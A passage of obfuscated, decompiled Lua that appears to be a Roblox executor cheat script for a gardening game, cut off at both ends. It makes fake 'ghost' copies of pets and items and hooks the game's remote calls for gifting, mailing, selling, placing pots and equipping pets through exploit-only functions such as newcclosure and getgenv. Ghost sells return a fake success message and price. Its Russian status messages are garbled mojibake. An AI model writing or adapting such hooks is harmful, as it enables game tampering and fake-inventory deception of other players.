	end
	local function v662(p186)
		if not p186 or not p186.part then
			return
		end

		if LocalPlayer:GetAttribute("IsInOwnGarden") == true then
			v654(p186, v561())

			if PetVisualController then
				pcall(function()
					PetVisualController:SnapPetsForPlayer(LocalPlayer)
				end)
			end
		else
			v658()
		end
	end
	local function v663(p187, p188)
		if not p187 or not p187.part then
			return
		end

		if not p188 then
			v662(p187)

			return
		end

		v527(p187.part, p188)

		if p188.inGarden then
			v654(p187, v561())
		end

		if PetVisualController then
			pcall(function()
				PetVisualController:SnapPetsForPlayer(LocalPlayer)
			end)
		end
	end
	local function v664(p189)
		local Character = LocalPlayer.Character

		if not Character then
			return
		end

		local Backpack = LocalPlayer:FindFirstChild("Backpack")

		for _, v in Character:GetChildren() do
			if v:IsA("Tool") and v ~= p189 and v412(v) and Backpack then
				v.Parent = Backpack
			end
		end
	end
	local function v669()
		if t33.ghostPetLoop then
			t33.ghostPetLoop:Disconnect()
			t33.ghostPetLoop = nil
		end
	end
	local function v670()
		if t33.ghostPetLoop then
			return
		end

		t33.ghostPetLoop = RunService.Heartbeat:Connect(function(dt)
			if not next(t33.ghostPets) then
				v669()
				t33.ghostPetMode = nil

				return
			end

			local ghostPetMode = LocalPlayer:GetAttribute("IsInOwnGarden") == true and "garden" or "follow"

			if t33.ghostPetMode ~= ghostPetMode then
				t33.ghostPetMode = ghostPetMode

				if ghostPetMode == "follow" then
					v630()
				end

				local v672 = ghostPetMode == "garden" and v561()

				v672 = v672 or nil

				local followIndex = 0

				for _, v in v631() do
					local data = v.data
					local part = data.part

					if part and part.Parent then
						data.wanderTarget = nil
						data.idleUntil = nil

						if ghostPetMode == "follow" then
							followIndex += 1
							data.followIndex = followIndex
							v639(part, followIndex)
						else
							data.followIndex = nil
							v654(data, v672)
						end
					end
				end

				if ghostPetMode == "follow" then
					v658()
				elseif ghostPetMode == "garden" and PetVisualController then
					pcall(function()
						PetVisualController:SnapPetsForPlayer(LocalPlayer)
					end)
				end
			end

			if ghostPetMode ~= "garden" then
				return
			end

			for _, ghostPet in pairs(t33.ghostPets) do
				local part = ghostPet.part

				if part and part.Parent then
					local v681 = v561()

					if v681 then
						local Position = part.Position

						if ghostPet.idleUntil then
							if os.clock() < ghostPet.idleUntil then
								v648(part)

								continue
							end

							ghostPet.idleUntil = nil
						end

						local v683 = v571(v681, Position)

						if v683 then
							if not ghostPet.wanderTarget or not v571(v681, ghostPet.wanderTarget) then
								ghostPet.wanderTarget = v597(v681)
							end
						elseif not ghostPet.wanderTarget or v571(v681, ghostPet.wanderTarget) then
							ghostPet.wanderTarget = v588(v681, Position)
						end

						local wanderTarget = ghostPet.wanderTarget
						local v685 = v532(part)
						local v686 = wanderTarget.X - Position.X
						local v687 = wanderTarget.Z - Position.Z
						local v688 = math.sqrt(v686 * v686 + v687 * v687)

						if v683 and v688 < 2 then
							v653(ghostPet)
						elseif v688 > 0.05 then
							local v689 = math.min(v688, 10 * dt)
							local v690 = Position.X + v686 / v688 * v689
							local v691 = Position.Z + v687 / v688 * v689

							part.CFrame = v551(v690, v535(v690, v691, wanderTarget.Y, v685), v691, v686, v687)
						elseif v683 then
							v653(ghostPet)
						else
							part.CFrame = v551(Position.X, Position.Y, Position.Z, v686, v687)
						end
					end
				end
			end
		end)
	end
	local function v692(p190, p191)
		local v693 = tostring(p190)
		local v694 = t33.ghostPets[v693]

		if not v694 then
			return
		end

		if v694.partConn then
			v694.partConn:Disconnect()
			v694.partConn = nil
		end

		if v694.part and v694.part.Parent then
			v694.part:Destroy()
		end

		t33.ghostPets[v693] = nil

		if not p191 then
			v549(v693)
		end
	end
	local function v695(p192)
		if not p192 then
			return
		end

		local Backpack = LocalPlayer:FindFirstChild("Backpack")

		if not Backpack then
			return
		end

		local Character = LocalPlayer.Character

		if Character and p192.Parent == Character then
			local Humanoid = Character:FindFirstChildOfClass("Humanoid")

			if Humanoid then
				pcall(function()
					Humanoid:UnequipTools()
				end)
			end
		end

		if p192.Parent ~= Backpack then
			p192.Parent = Backpack
		end
	end
	local function v699(p193)
		if not p193 or not v412(p193) then
			return
		end

		local v700 = v429(p193)

		if v700 and v406(v700) and t33.ghostPets[v700].tool == p193 then
			return
		end

		v695(p193)
	end
	local function v701(p194)
		if not p194 then
			return
		end

		local Character = LocalPlayer.Character

		if Character then
			if p194.Parent == Character then
				local Humanoid = Character:FindFirstChildOfClass("Humanoid")

				if Humanoid then
					pcall(function()
						Humanoid:UnequipTools()
					end)
				end
			end
		end

		if p194.Parent ~= Folder then
			p194.Parent = Folder
		end
	end
	local function v704(p195)
		if not v412(p195) or t33.petBound[p195] then
			return
		end

		v422(p195)
		t33.petBound[p195] = true

		if not p195:FindFirstChild("Handle") then
			p195.RequiresHandle = false
		end
	end
	local function v705(p196, p197)
		local v706 = tostring(p196)
		local v707 = t33.ghostPets[v706]

		if not v707 then
			return false
		end

		local tool = v707.tool or v444(v706)

		v692(v706, p197)
		v695(tool)

		return true
	end
	local function v709(p198, p199, p200, p201)
		if p200 and p200.Parent then
			p200:Destroy()
		end

		if p198 then
			t33.ghostPets[p198] = nil
		end

		v699(p199)

		if p201 then
			v408(p201)
		end
	end
	local function v710(p202, p203, p204)
		if p203 then
			for _, v in {
				"PetSize",
				"PetType",
				"PetMutation"
			}, nil, nil do
				local attribute = p203:GetAttribute(v)

				if attribute ~= nil then
					p202:SetAttribute(v, attribute)
				end
			end

			local v714 = v532(p203)

			if v714 then
				p202:SetAttribute("Pet", v714)
			end
		end

		if p204 then
			if p204.Size then
				p202:SetAttribute("PetSize", p204.Size)
			end

			if p204.Type then
				p202:SetAttribute("PetType", p204.Type)
			end

			if p204.Name then
				p202:SetAttribute("Pet", p204.Name)
			end
		end
	end
	local function v715(p205)
		local v716 = tostring(p205)
		local v717 = v444(v716)

		if v717 and v471(v717) and not v378(v717) then
			return v717
		end

		local t45 = {
			Folder,
			LocalPlayer:FindFirstChild("Backpack"),
			LocalPlayer.Character
		}

		for _, v in t45, nil, nil do
			if v then
				for _, v3 in v:GetChildren() do
					if v3:IsA("Tool") and not (tostring(v3:GetAttribute("PetId")) ~= v716 or v378(v3)) then
						return v3
					end
				end
			end
		end
	end
	local function v723(p206, p207)
		local Name = p206 and v532(p206)

		Name = Name or p207 and p207.Name

		if not Name then
			return
		end

		for _, v in v435() do
			if v471(v) then
				if v:GetAttribute("Pet") ~= Name then
					continue
				end

				local clone = v:Clone()

				v410(clone)
				v498(clone)
				v710(clone, p206, p207)
				clone.Parent = LocalPlayer:WaitForChild("Backpack")

				return clone
			end
		end
	end
	local function v728(p208, p209, p210, p211)
		local v729 = v715(p208)

		if v729 or not p211 then
			return v729
		end

		return v723(p209, p210)
	end
	local function v730(p212, p213)
		p213.partConn = p213.part.Destroying:Connect(function()
			task.defer(function()
				if t33.ghostPets[p212] ~= p213 then
					return
				end

				t33.ghostPets[p212] = nil

				if p213.partConn then
					p213.partConn:Disconnect()
					p213.partConn = nil
				end

				if p213.tool then
					v695(p213.tool)
				end

				v549(p212)
			end)
		end)
	end
	local function v731(p214, p215, p216, p217)
		local v732 = tostring(p214)
		local v733 = t33.petGhostSwap[v732]

		if v733 and t33.ghostPets[v733] then
			return true
		end

		if not p215 then
			return false
		end

		local v734 = v409()
		local v735 = v511()

		if not v735 then
			return false
		end

		local v736 = tonumber(p217 and p217.slotVisualIndex) or v395(v734, v732) + 1
		local Part = Instance.new("Part")

		Part.Name = v531()
		Part.Size = Vector3.new(0.2, 0.2, 0.2)
		Part.Transparency = 1
		Part.Anchored = true
		Part.CanCollide = false
		Part.CanQuery = false
		Part.CanTouch = false
		v539(p215, Part, v734, v736)

		if p217 and p217.cframe then
			Part.CFrame = p217.cframe
		else
			Part.CFrame = p215.CFrame
		end

		v527(Part, p217)
		Part.Parent = v735

		local t46 = {
			part = Part,
			tool = nil,
			listEntry = p216,
			swapRealId = v732
		}

		t33.ghostPets[v734] = t46
		v730(v734, t46)
		v663(t46, p217)
		v547(nil, v734, p216)
		t33.petGhostSwap[v732] = v734
		v670()
		task.defer(function()
			v547(nil, v734, p216)
		end)

		return true
	end
	local function v739(p218, p219)
		if not p219 then
			return false
		end

		local v740 = tostring(p218)
		local v741 = t33.petGhostSwap[v740]

		if not v741 then
			return false
		end

		local v742 = t33.ghostPets[v741]

		if not v742 or v742.tool then
			return false
		end

		v493(v740)
		v494(p219)

		if not v378(p219) then
			v410(p219)
			v498(p219)
		end

		v742.tool = p219
		task.defer(function()
			v704(p219)
		end)
		v701(p219)

		return true
	end
	local function v743(p220, p221)
		local v744 = p221 or {}
		local snapshot = v744.snapshot
		local replacePetId = v744.replacePetId
		local silent = v744.silent
		local v748 = v429(p220)

		if not v748 then
			return false
		end

		local attribute = p220:GetAttribute("Pet") or p220.Name

		if type(attribute) ~= "string" or attribute == "" then
			if not silent then
				v408("Ghost-РїРёС‚РѕРјРµС†: РІРёРґ РЅРµ РЅР°Р№РґРµРЅ")
			end

			v699(p220)

			return false
		end

		local v750 = t33.ghostPets[v748]

		if v750 and not (v750.tool ~= p220 or replacePetId) then
			v692(v748)
			v699(p220)

			return true
		end

		local v751 = replacePetId and {
			v748,
			replacePetId
		} or v748
		local v752 = v395(v751)

		if v375() <= v752 then
			if not silent then
				v709(nil, p220, nil, ("РњР°РєСЃ. %d active pets"):format(v375()))
			end

			return false
		end

		local v753 = v511()

		if not v753 then
			if not silent then
				v408("Ghost-РїРёС‚РѕРјРµС†: PlayerPetReferences РЅРµС‚")
			end

			v699(p220)

			return false
		end

		local v754 = snapshot and tonumber(snapshot.slotVisualIndex)

		v754 = v754 or v395(v751) + 1

		local Part = Instance.new("Part")

		Part.Name = v531()
		Part.Size = Vector3.new(0.2, 0.2, 0.2)
		Part.Transparency = 1
		Part.Anchored = true
		Part.CanCollide = false
		Part.CanQuery = false
		Part.CanTouch = false
		v544(p220, Part, v748, v754)

		if snapshot and snapshot.cframe then
			Part.CFrame = snapshot.cframe
		else
			Part.CFrame = v553(p220)
		end

		v527(Part, snapshot)
		Part.Parent = v753

		local t47 = {
			part = Part,
			tool = p220,
			listEntry = v744.listEntry
		}
		local v757 = v395(v751)

		if v375() <= v757 then
			if silent then
				v709(v748, p220, Part, nil)
			else
				v709(v748, p220, Part, ("РњР°РєСЃ. %d active pets"):format(v375()))
			end

			return false
		end

		t33.ghostPets[v748] = t47
		v730(v748, t47)
		v664(p220)
		v701(p220)
		v663(t47, snapshot)
		v547(p220, v748, v744.listEntry)
		v670()

		if not silent then
			v408("Ghost-РїРёС‚РѕРјРµС† РЅР° Р·РµРјР»Рµ (РІРёР·СѓР°Р»)")
		end

		return true
	end
	local function v758(p222)
		v743(p222)
	end
	local function v759(p223, p224)
		local v760 = tostring(p223)

		if v377(v760) or t33.ghostPets[v760] then
			return false
		end

		local v761 = t33.pendingRealUnequip[v760]
		local v762 = v514(v760)
		local entry = v761 and v761.entry or v520(v760)

		if not (v762 or entry) then
			return false
		end

		local v764 = t33.petGhostSwap[v760]

		if v764 and t33.ghostPets[v764] then
			local v765 = v728(v760, v762, entry, p224 == true)

			if v765 and not t33.ghostPets[v764].tool then
				v739(v760, v765)
			end

			return true
		end

		local snapshot = v761 and v761.snapshot or v526(v762)

		if not snapshot and v762 then
			snapshot = v526(v762)
		end

		local v767 = v728(v760, v762, entry, p224 == true)

		if not v767 then
			return false
		end

		v493(v760)
		v494(v767)

		if not v378(v767) then
			v410(v767)
			v498(v767)
		end

		task.defer(v704, v767)

		if not v743(v767, {
			snapshot = snapshot,
			replacePetId = v760,
			silent = true,
			listEntry = entry
		}) then
			return false
		end

		local v768 = tostring(v767:GetAttribute("PetId"))

		t33.petGhostSwap[v760] = v768
		task.defer(function()
			v547(v767, v768, entry)
		end)

		return true
	end
	local function v769(p225)
		local v770 = tostring(p225)

		if v377(v770) or t33.ghostPets[v770] then
			return
		end

		local v771 = v514(v770)
		local v772 = v520(v770)

		if not (v771 or v772) then
			return
		end

		t33.pendingRealUnequip[v770] = {
			snapshot = v526(v771),
			entry = v772
		}

		if v759(v770, false) then
			t33.pendingRealUnequip[v770] = nil

			return
		end

		if v771 then
			v731(v770, v771, v772, t33.pendingRealUnequip[v770].snapshot)
		end
	end
	local function v773(p226)
		local v774 = tostring(p226)
		local v775 = t33.pendingRealUnequip[v774]

		if not v775 then
			return
		end

		local v776 = v728(v774, nil, v775.entry, true)

		if v776 and v739(v774, v776) then
			t33.pendingRealUnequip[v774] = nil

			return
		end

		for i = 1, 20 do
			local v778 = v728(v774, nil, v775.entry, true)

			if v778 and v739(v774, v778) then
				t33.pendingRealUnequip[v774] = nil

				return
			end

			if v759(v774, true) then
				t33.pendingRealUnequip[v774] = nil

				return
			end

			task.wait(0.05)
		end

		t33.pendingRealUnequip[v774] = nil
	end
	local function v779(p227)
		if not v412(p227) then
			return
		end

		local v780 = v429(p227)

		if not v780 then
			return
		end

		if t33.ghostPets[v780] then
			if v705(v780) then
				v408("Ghost-РїРёС‚РѕРјРµС† СѓР±СЂР°РЅ")
			end
		else
			v758(p227)
		end
	end
	local function v781(p228)
		local v782 = p228 or v430()

		if not v412(v782) then
			return
		end

		local v783 = v429(v782)

		if not v783 then
			return
		end

		local now = os.clock()

		if t33.petToggleLock[v783] and now - t33.petToggleLock[v783] < 0.35 then
			return
		end

		t33.petToggleLock[v783] = now
		v779(v782)
	end
	local function v785(p229)
		if not v412(p229) then
			return
		end

		local Character = LocalPlayer.Character

		if not Character then
			return
		end

		if p229.Parent == Character then
			return
		end

		if not p229:FindFirstChild("Handle") then
			p229.RequiresHandle = false
		end

		local Humanoid = Character:FindFirstChildOfClass("Humanoid")

		if Humanoid then
			pcall(function()
				Humanoid:EquipTool(p229)
			end)
		end

		if p229.Parent ~= Character then
			p229.Parent = Character
		end
	end
	local function v788()
		v482()

		local function v789(p230)
			if not p230 then
				return
			end

			for _, v in p230:GetChildren() do
				v704(v)
			end
		end

		local Backpack = LocalPlayer:WaitForChild("Backpack")

		v789(Backpack)
		table.insert(t33.conns, Backpack.ChildAdded:Connect(function(child)
			task.defer(v704, child)
		end))

		local function v793(character)
			v789(character)
			table.insert(t33.conns, character.ChildAdded:Connect(function(child)
				task.defer(v704, child)
			end))
		end

		if LocalPlayer.Character then
			v793(LocalPlayer.Character)
		end

		table.insert(t33.conns, LocalPlayer.CharacterAdded:Connect(v793))
	end
	local function v794(p231)
		return p231 and type(p231:GetAttribute("Count")) == "number"
	end
	local function v795(p232)
		return p232:GetAttribute("Count") or 1
	end
	local function v796(p233)
		if not p233 then
			return
		end

		if p233:GetAttribute("SeedTool") then
			return "Seed:" .. p233:GetAttribute("SeedTool")
		end

		if p233:GetAttribute("Sprinkler") then
			return "Sprinkler:" .. p233:GetAttribute("Sprinkler")
		end

		if p233:GetAttribute("WateringCan") then
			return "WateringCan:" .. p233:GetAttribute("WateringCan")
		end

		if p233:GetAttribute("Mushroom") then
			return "Mushroom:" .. p233:GetAttribute("Mushroom")
		end

		if p233:GetAttribute("Gnome") then
			return "Gnome:" .. p233:GetAttribute("Gnome")
		end

		if p233:GetAttribute("Crate") then
			return "Crate:" .. p233:GetAttribute("Crate")
		end

		if p233:GetAttribute("SeedPack") then
			return "SeedPack:" .. p233:GetAttribute("SeedPack")
		end

		return "Name:" .. p233.Name
	end
	local function v797(p234)
		for _, v in v435() do
			if v378(v) then
				if v796(v) == p234 then
					return v
				end
			end
		end
	end
	local function v800(p235)
		local v801 = t33.stackDisplay[p235]

		if not v801 then
			return
		end

		if v795(p235) ~= v801 then
			t33.stackFixing[p235] = true
			p235:SetAttribute("Count", v801)
			t33.stackFixing[p235] = nil
		end
	end
	local function v802(p236)
		if t33.stackBound[p236] then
			return
		end

		t33.stackBound[p236] = true
		table.insert(t33.conns, p236:GetAttributeChangedSignal("Count"):Connect(function()
			if t33.stackFixing[p236] then
				return
			end

			task.defer(v800, p236)
		end))
		table.insert(t33.conns, p236.Destroying:Connect(function()
			t33.stackDisplay[p236] = nil
			t33.stackBound[p236] = nil
			t33.stackFixing[p236] = nil
		end))
	end
	local function v803(p237, p238)
		local v804 = os.clock() + 0.5

		while p237.Parent and os.clock() < v804 do
			if v795(p237) < p238 then
				return
			end

			task.wait()
		end
	end
	local function v805(p239, p240)
		if not t33.stackDisplay[p239] then
			t33.stackDisplay[p239] = p240
		end

		v802(p239)
		task.defer(function()
			if not p239.Parent then
				return
			end

			v803(p239, t33.stackDisplay[p239])
			v800(p239)
		end)
	end
	local function v806(p241)
		p241:SetAttribute(s5, true)
		p241:SetAttribute("Id", nil)
		p241:SetAttribute("PetId", nil)

		return p241
	end
	local function v807(p242)
		local v808 = v795(p242)
		local v809 = v796(p242)
		local v810 = v809 and v797(v809)

		if v810 then
			v810:SetAttribute("Count", v795(v810) + v808)

			return v810
		end

		local clone = p242:Clone()

		v806(clone)
		v498(clone)
		clone:SetAttribute("Count", v808)
		clone.Parent = LocalPlayer:WaitForChild("Backpack")

		return clone
	end
	local function v812(p243, p244)
		if v794(p243) then
			local v813 = v807(p243)

			if p244 and p244 ~= LocalPlayer:WaitForChild("Backpack") then
				v813.Parent = p244
			end

			return v813
		end

		local clone = p243:Clone()

		v410(clone)
		v498(clone)
		clone.Parent = p244 or LocalPlayer:WaitForChild("Backpack")

		if v412(clone) then
			task.defer(v704, clone)
		end

		return clone
	end
	local function v815(p245)
		local v816 = v462(p245)
		local v817 = t33.pendingGifts[v816]

		if not v817 then
			return
		end

		if v817.template then
			v817.template:Destroy()
		end

		t33.pendingGifts[v816] = nil
		v464(v816)
	end
	local function v818(p246)
		local v819 = v462(p246)
		local v820 = t33.pendingGifts[v819]

		if not v820 or not v820.template then
			v815(v819)

			return
		end

		local template = v820.template

		t33.pendingGifts[v819] = nil
		v464(v819)
		task.defer(function()
			if template.Parent then
				template.Parent = LocalPlayer:WaitForChild("Backpack")
				v704(template)
				v408("Ghost-РєР»РѕРЅ РґРѕР±Р°РІР»РµРЅ")
			end
		end)
	end
	local function v822(p247, p248)
		local v823 = tostring(p248)

		v815(v823)

		local v824 = v812(p247, Folder)

		t33.pendingGifts[v823] = {
			template = v824
		}
		task.delay(45, function()
			if t33.pendingGifts[v823] and t33.pendingGifts[v823].template == v824 then
				v815(v823)
			end
		end)
	end
	local function v825(p249, p250, p251)
		task.defer(function()
			local v826 = os.clock() + 0.75
			local exitTo

			while true do
				if not (os.clock() < v826) then
					exitTo = 1

					break
				end

				if p249.Parent and v468(p249) then
					break
				end

				if v472(p250) then
					task.wait()

					continue
				end

				exitTo = 1

				break
			end

			if exitTo ~= 1 then
				p251:Destroy()

				return
			end

			if v472(p250) then
				p251:Destroy()

				return
			end

			if p250 and t33.suppress[tostring(p250)] then
				p251:Destroy()

				return
			end

			if v496(p249) then
				p251:Destroy()

				return
			end

			local v828 = v812(p251)

			p251:Destroy()

			if v828.Parent ~= LocalPlayer:WaitForChild("Backpack") then
				v828.Parent = LocalPlayer:WaitForChild("Backpack")
			end

			v408("Ghost-РєР»РѕРЅ РґРѕР±Р°РІР»РµРЅ")
		end)
	end
	local function v829(child)
		if not v434(child) or v378(child) then
			return
		end

		if v468(child) then
			return
		end

		local v830 = v461(child)

		if v830 and t33.pendingGifts[v462(v830)] then
			v818(v830)

			return
		end

		if v496(child) then
			return
		end

		if v471(child) then
			local clone = child:Clone()

			v825(child, v830, clone)

			return
		end

		if v794(child) then
			local v832 = v796(child)

			if v832 and t33.handledStackRemoval[v832] then
				return
			end

			v807(child)
		else
			v812(child)
		end

		v408("Ghost-РєР»РѕРЅ РґРѕР±Р°РІР»РµРЅ")
	end
	local function v833(p252)
		if not p252 or not v378(p252) then
			return
		end

		local v834 = v429(p252) or v461(p252)

		if v834 then
			v692(v834)
		end

		p252:SetAttribute(s5, nil)
		p252.Parent = Folder
		p252:Destroy()
	end
	local function v835(p253)
		local attribute = p253:GetAttribute("FruitName") or p253:GetAttribute("Fruit") or p253:GetAttribute("Pet")

		if not attribute then
			return 0
		end

		if not p253:GetAttribute("Pet") then
			local ok, result = pcall(function()
				return require(ReplicatedStorage.SharedModules.SellValueData)
			end)

			return ok and (result[attribute] or 0) or 0
		end

		local ok, result = pcall(function()
			return require(ReplicatedStorage.SharedData.PetData)
		end)

		if ok then
			if result[attribute] then
				return math.floor((result[attribute].BasePrice or 0) * 0.5)
			end
		end

		return 0
	end
	local function v841(p254, p255, p256)
		local clone = ReplicatedStorage.Assets.POT:Clone()

		clone:SetAttribute(s5, true)
		pcall(function()
			clone:ScaleTo(p256:GetAttribute("SizeMultiplier") or 1)
		end)
		clone:PivotTo(CFrame.new(p254) * CFrame.Angles(0, math.rad(p255 or 0), 0))

		for _, v in clone:GetDescendants() do
			if v:IsA("BasePart") then
				v.Anchored = true
				v.CanCollide = false
				v.CanQuery = false
				v.CanTouch = false
			end
		end

		local attribute = p256:GetAttribute("PlantName")

		if attribute then
			local v846 = ReplicatedStorage.Assets.Plants:FindFirstChild(attribute) or ReplicatedStorage.Assets.Fruits:FindFirstChild(attribute)

			if v846 then
				local clone2 = v846:Clone()

				clone2:SetAttribute(s5, true)

				for _, v in clone2:GetDescendants() do
					if v:IsA("BasePart") then
						v.Anchored = true
						v.CanCollide = false
						v.CanQuery = false
						v.CanTouch = false
					end
				end

				clone2:PivotTo(clone:GetPivot())
				clone2.Parent = clone
			end
		end

		clone.Parent = Folder2
	end
	local function v850(p257, p258, p259)
		if not t33.originals[p257] and p258 then
			if type(p258.Fire) == "function" then
				local Fire = p258.Fire

				t33.originals[p257] = Fire

				local function fire(p260, ...)
					return p259(Fire, p260, ...)
				end

				if newcclosure then
					fire = newcclosure(fire)
				end

				p258.Fire = fire

				return true
			end
		end

		return false
	end
	local function v853(p261, p262, p263, p264, p265, ...)
		if type(p264) == "table" then
			for _, v in p264, nil, nil do
				if type(v) ~= "table" or v.Category ~= "Pets" or not v.ItemKey then
					continue
				end

				local v856 = tostring(v.ItemKey)

				if v377(v856) then
					v408("Ghost РЅРµР»СЊР·СЏ РїРµСЂРµРґР°С‚СЊ")

					return nil
				end

				local v857 = v444(v856)

				if v857 and not v378(v857) then
					v822(v857, v856)
				end
			end
		end

		return p261(p262, p263, p264, p265, ...)
	end
	local function v858(p266, p267, p268, ...)
		if t33.petHookBusy then
			return p266(p267, p268, ...)
		end

		if not v377(p268) then
			v493(p268)

			local v859 = v444(p268) or v454()

			if v859 then
				v494(v859)
			end

			return p266(p267, p268, ...)
		end

		t33.petHookBusy = true

		local v860 = v430()
		local v861

		if v860 and tostring(v860:GetAttribute("PetId")) == tostring(p268) then
			v861 = v860
		else
			v861 = v444(p268)
		end

		if v861 then
			local v862 = v429(v861)

			if v862 and not v406(v862) then
				local v863 = v395(v862)

				if v375() <= v863 then
					v408(("РњР°РєСЃ. %d active pets"):format(v375()))
					v699(v861)
				else
					v785(v861)
					v781(v861)
				end
			else
				v785(v861)
				v781(v861)
				t33.petHookBusy = false

				return true
			end
		end

		t33.petHookBusy = false

		return true
	end
	local function v864(p269, p270, p271, ...)
		local v865 = v476(p271, v430()) or v454()

		if v865 and v412(v865) then
			v785(v865)

			return true
		end

		if v865 and v471(v865) then
			v494(v865)

			local v866 = v461(v865)

			if v866 then
				v493(v866)
			end
		end

		return p269(p270, p271, ...)
	end
	local function v867(p272, p273, p274, ...)
		local v868 = tostring(p274)

		if (t33.ghostPets[v868] or v377(v868)) and v705(v868, true) then
			v408("Ghost-РїРёС‚РѕРјРµС† СѓР±СЂР°РЅ")

			return true
		end

		v769(v868)

		local v869 = p272(p273, v868, ...)

		if t33.pendingRealUnequip[v868] then
			task.defer(v773, v868)
		end

		return v869
	end
	local function v870(p275, p276, p277, ...)
		local v871 = v476(p277) or v430()

		if v871 and v412(v871) then
			local Backpack = LocalPlayer:FindFirstChild("Backpack")

			if Backpack and v871.Parent == LocalPlayer.Character then
				v871.Parent = Backpack
			end

			return true
		end

		if v871 and v471(v871) and not v378(v871) then
			local v873 = v461(v871)

			if v873 then
				v769(v873)
			end
		end

		local v874 = p275(p276, p277, ...)

		for k in pairs(t33.pendingRealUnequip) do
			task.defer(v773, k)
		end

		return v874
	end
	local function v876(p278, p279, p280, p281, p282, ...)
		if v377(p282) then
			v408("Ghost РЅРµР»СЊР·СЏ РїРµСЂРµРґР°С‚СЊ")

			return nil
		end

		local v877 = v457(p282)
		local clone = v877 and not v378(v877) and v794(v877) and v877:Clone() or nil
		local v879 = clone and v795(clone) or nil

		if v877 and not (v378(v877) or v794(v877)) then
			v822(v877, v461(v877) or tostring(p282))
		end

		local v880, v881, v882, v883, v884 = p278(p279, p280, p281, p282, ...)

		if v877 and not v378(v877) and v794(v877) and v879 then
			local Parent = v877.Parent and v468(v877) and v877 or v457(p282)

			if Parent and v468(Parent) and v796(Parent) == v796(v877) then
				v805(Parent, v879)
			elseif clone then
				local v886 = v796(clone)

				if v886 then
					t33.handledStackRemoval[v886] = true
					task.delay(1, function()
						t33.handledStackRemoval[v886] = nil
					end)
				end

				v807(clone)
				v408("Ghost-РєР»РѕРЅ РґРѕР±Р°РІР»РµРЅ")
			end
		end

		if clone then
			clone:Destroy()
		end

		return v880, v881, v882, v883, v884
	end
	local function v887(p283, p284, p285, ...)
		if not v377(p285) then
			local v888 = v444(p285)

			if v888 then
				v494(v888)
			end

			return p283(p284, p285, ...)
		end

		local v889 = v444(p285)
		local v890 = v889 and v835(v889) or 0

		if v889 then
			v833(v889)
		end

		v408(("Ghost sell: +%sВў (РІРёР·СѓР°Р»)"):format(tostring(v890)))

		return {
			Success = true,
			SellPrice = v890
		}
	end
	local function v891(p286, p287, p288, ...)
		if not v377(p288) then
			local v892 = v444(p288)

			if v892 then
				v494(v892)
			end

			return p286(p287, p288, ...)
		end

		local v893 = v444(p288)
		local v894 = v893 and v835(v893) or 0

		if v893 then
			v833(v893)
		end

		v408(("Ghost sell pet: +%sВў (РІРёР·СѓР°Р»)"):format(tostring(v894)))

		return {
			Success = true,
			SellPrice = v894
		}
	end
	local function v895(p289, p290, p291, p292, p293, ...)
		if not v377(p293) then
			local v896 = v444(p293)

			if v896 then
				v494(v896)
			end

			return p289(p290, p291, p292, p293, ...)
		end

		local v897 = v444(p293)

		if v897 then
			v841(p291, p292, v897)
			v833(v897)
			v408("Ghost: РїРѕСЃС‚Р°РІР»РµРЅРѕ (РІРёР·СѓР°Р»)")
		end

		return true
	end
	local function v898(p294, p295, p296, ...)
		if v377(p296) then
			return nil
		end

		local v899 = v444(p296)

		if v899 then
			v494(v899)
		end

		return p294(p295, p296, ...)
	end
	local function v900(p297, p298, p299, ...)
		if v377(p299) then
			return nil
		end

		local v901 = v444(p299)

		if v901 then
			v494(v901)
		end

		return p297(p298, p299, ...)
	end
	local function v902()
		table.insert(t33.conns, LocalPlayer:WaitForChild("Backpack").ChildRemoved:Connect(v829))

		local function v903(character)
			table.insert(t33.conns, character.ChildRemoved:Connect(v829))
		end

		if LocalPlayer.Character then
			v903(LocalPlayer.Character)
		end

		table.insert(t33.conns, LocalPlayer.CharacterAdded:Connect(v903))
	end
	local function v904()
		if t33.petUnequipUIHook then
			return
		end

		local PetUnequipped = Networking.Pets and Networking.Pets.PetUnequipped

		if not PetUnequipped or not PetUnequipped.OnClientEvent then
			return
		end

		t33.petUnequipUIHook = true
		table.insert(t33.conns, PetUnequipped.OnClientEvent:Connect(function(p300)
			if type(p300) ~= "string" then
				return
			end

			local v906 = t33.petGhostSwap[p300]

			if not v906 then
				return
			end

			t33.petGhostSwap[p300] = nil
			task.defer(function()
				local v907 = t33.ghostPets[v906]

				if v907 then
					v547(v907.tool, v906, v907.listEntry)

					return
				end
			end)
		end))
	end
	local function v908()
		if not Networking.Pets then
			return
		end

		v850("PetToggle", Networking.Pets.RequestToggleFollower, v858)
		v850("PetEquip", Networking.Pets.RequestEquipByName, v864)
		v850("PetUnequip", Networking.Pets.RequestUnequipByName, v870)
		v850("PetUnequipId", Networking.Pets.RequestUnequip, v867)
		v904()
	end
	local function v909()
		local v910 = v850
		local s8 = "Gift"
		local Gifting = Networking.Gifting

		v910(s8, Gifting and Networking.Gifting.Send, v876)
		v850("Mail", Networking.Mailbox and Networking.Mailbox.SendBatch, v853)
		v850("SellFruit", Networking.NPCS and Networking.NPCS.SellFruit, v887)
		v850("SellPet", Networking.NPCS and Networking.NPCS.SellPet, v891)
		v850("PlacePot", Networking.PotPlacement and Networking.PotPlacement.PlacePottedPlant, v895)
		v850("Promote", Networking.Backpack and Networking.Backpack.PromoteFruit, v898)
		v850("Demote", Networking.Backpack and Networking.Backpack.DemoteFruit, v900)
		v908()
	end

	getgenv().GhostInvUnload = function()
		for k, v in t33.originals, nil, nil do
			local v915 = ({
				Gift = Networking.Gifting and Networking.Gifting.Send,
				Mail = Networking.Mailbox and Networking.Mailbox.SendBatch,
				SellFruit = Networking.NPCS and Networking.NPCS.SellFruit,
				SellPet = Networking.NPCS and Networking.NPCS.SellPet,
				PlacePot = Networking.PotPlacement and Networking.PotPlacement.PlacePottedPlant,
				Promote = Networking.Backpack and Networking.Backpack.PromoteFruit,
				Demote = Networking.Backpack and Networking.Backpack.DemoteFruit,
				PetToggle = Networking.Pets and Networking.Pets.RequestToggleFollower,
				PetEquip = Networking.Pets and Networking.Pets.RequestEquipByName,
				PetUnequip = Networking.Pets and Networking.Pets.RequestUnequipByName,
				PetUnequipId = Networking.Pets and Networking.Pets.RequestUnequip
			})[k]

			if not v915 and Networking.Pets and k:sub(1, 4) == "Pet_" then
				v915 = Networking.Pets[k:sub(5)]
			end

			if v915 and v915.Fire then
				v915.Fire = v
			end
		end

		for _, v in t33.conns, nil, nil do
			pcall(function()
				v:Disconnect()
			end)
		end

		for k in pairs(t33.pendingGifts) do
			v815(k)
		end

		if t33.petMouseConn then
			pcall(function()
				t33.petMouseConn:Disconnect()
			end)
